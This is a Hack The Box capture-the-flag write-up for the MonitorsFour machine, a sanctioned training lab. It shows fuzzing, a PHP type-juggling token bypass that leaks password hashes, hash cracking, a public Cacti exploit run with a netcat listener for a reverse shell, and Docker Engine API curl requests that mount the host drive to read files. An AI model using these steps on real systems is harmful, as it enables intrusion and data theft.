# MonitorsFour Machine

**Platform:** Hack The Box

**Author:** 0xL0m4

**Category:** Windows (Easy)

<img width="1567" height="149" alt="image" src="https://github.com/user-attachments/assets/718dcc6e-06cd-441a-ace4-71fa356c255c" />


## Overview

In this write-up, we will walk through the MonitorsFour machine, moving from initial enumeration to full exploitation and ultimately achieving complete system compromise.


## Tools Used

* Nmap
* FFUF
* Burp Suite
* Hashcat


## Steps

## 1. Simple Recon

Start the machine and add its IP address to your /etc/hosts file.

First, perform a scan to identify open ports:

```
nmap -Pn <machine_ip>
```

**Result:**

```
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
```

Open the web application in your browser.

I found a login page and tried SQL injection, but it was not vulnerable.

<img width="1920" height="936" alt="image" src="https://github.com/user-attachments/assets/ddf81bf1-7044-4b19-9edd-13c8148ec61a" />


While inspecting the source code, I found an API endpoint: /api/v1/auth. I tried fuzzing it using ffuf:

```
ffuf -u "http://monitorsfour.htb/api/v1/FUZZ" \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

**Result:**

```
auth     [Status: 405]
logout   [Status: 302]
user     [Status: 200]
users    [Status: 200]
```

Before using Burp Suite, I checked for subdomains using virtual host discovery:

```
ffuf -w /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt \
-u http://monitorsfour.htb/ \
-H "Host: FUZZ.monitorsfour.htb" \
-fs 138
```

**Result:** cacti

Add it to /etc/hosts.


## 2. Finding Credentials

When accessing the /users endpoint, a token parameter was required.

<img width="1594" height="773" alt="image" src="https://github.com/user-attachments/assets/88d45b74-a168-44fc-9ef4-fb2796a9b4c6" />


I fuzzed it:

```
ffuf -u "http://monitorsfour.htb/api/v1/users?token=FUZZ" \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
-fs 36
```

**Result:**

```
0
00
```

Using 0 returned sensitive user data.

<img width="1601" height="780" alt="image" src="https://github.com/user-attachments/assets/25defd26-2299-43a8-8086-566bbf876528" />


This happens due to a PHP type juggling vulnerability, where == is used instead of ===, causing non-numeric strings like 0e... to evaluate as 0.

Extracted hash password for admin for retrieved data:

```
56b32eb43e6f15395f6c46c1c9e1cd36
```

Cracked using hashcat:

```bash
hashid key.txt   # md5
hashcat -a 0 -m 0 key.txt /usr/share/wordlists/rockyou.txt
```

**Result:**

```
wonderful1
```

---

## 3. Application Analysis

Login credentials:

* username: admin
* password: wonderful1

Login successful.

Found system hint: Windows Docker Desktop 4.44.2

<img width="1920" height="862" alt="image" src="https://github.com/user-attachments/assets/248a0016-d723-402f-abb5-1f1974a684ad" />


## 4. Cacti Subdomain

I returned to cacti subdomain.

Credentials did not work on Cacti login.

However, using the user’s name (marcus) worked.

Cacti version: 1.2.28

Exploit used:
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC

```
nc -lnvp 4000
python3 exploit.py -u marcus -p wonderful1 -i <vpn_ip> -l 4000 -url http://cacti.monitorsfour.htb
```

Shell obtained:

```
www-data@821fbd6a43fa
```

We are inside a Docker container.


## 5. User Flag

```
find / -name user.txt 2>/dev/null
```

Found:

```
/home/marcus/user.txt
```

```
cat /home/marcus/user.txt
```

User flag retrieved successfully.


## 6. Privilege Escalation

Docker Desktop 4.44.2 is vulnerable to CVE-2025-9074 , allowing SSRF to the Docker Engine API.

This allows:

* container creation
* host filesystem mounting
* command execution via containers


### Step 1: Create container

```bash
curl -s -X POST http://192.168.65.7:2375/containers/create \
-H "Content-Type: application/json" \
-d '{
  "image":"alpine",
  "Tty":true,
  "Cmd":["sh","-c","cat /mnt/users/administrator/desktop/root.txt"],
  "HostConfig":{
    "Binds":["/run/desktop/mnt/host/c/:/mnt"]
  }
}' | tee c.json
```

- image: lightweight Alpine Linux
- Tty: allocate terminal
- Cmd: runs command inside container
- Binds: mounts Windows C: drive into /mnt
- Output saved into c.json

Extract container ID from response.

---

### Step 2: Start container

```bash
curl -s -X POST http://192.168.65.7:2375/containers/$id/start
```


### Step 3: Get Root Flag

```
curl -s "http://192.168.65.7:2375/containers/$id/logs?stdout=1&stderr=1" \
2>/dev/null | strings

```
- stdout=1 → normal output
- stderr=1 → error output
- 2>/dev/null → hides curl errors
- strings → cleans binary noise

  Voilaa, we successfully get the root flag and the machine is done.

  #

  [The Machine Link](https://app.hackthebox.com/machines/MonitorsFour?sort_by=created_at&sort_type=desc)
  

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
